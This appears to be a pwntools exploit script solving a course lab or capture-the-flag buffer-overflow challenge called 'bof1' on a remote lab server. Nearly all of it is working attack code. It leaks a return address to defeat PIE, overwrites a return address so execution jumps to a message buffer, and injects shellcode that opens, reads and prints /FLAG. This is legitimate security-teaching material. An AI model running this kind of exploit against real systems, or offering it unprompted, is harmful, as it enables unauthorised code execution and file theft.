#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 12342

elf = ELF(exe)

base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

sc  = shellcraft.openat(-100, "/FLAG", 0, 0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 'rax')
sc += shellcraft.exit(0)

shellcode = asm(sc)
leak_message = b'A' * (0x30 + 0x8)

r.recvuntil(b"What's your name? ")
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')

pie_base = ret_addr - 0x9c99
msg_addr = pie_base + 0xef220
leak_message = b'A' * (0x60 + 0x8) + msg_addr.to_bytes(8, byteorder='little')

r.recvuntil(b"What's the room number? ")
r.send(leak_message)

leak_message = b'What the fuck is lab6?'
r.recvuntil(b"What's the customer's name? ")
r.send(leak_message)
r.recvuntil(b"Leave your message: ")
payloads = shellcode
r.send(payloads)

r.recvuntil(b"Thank you!\n")
flag = r.recv()
print(flag)
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :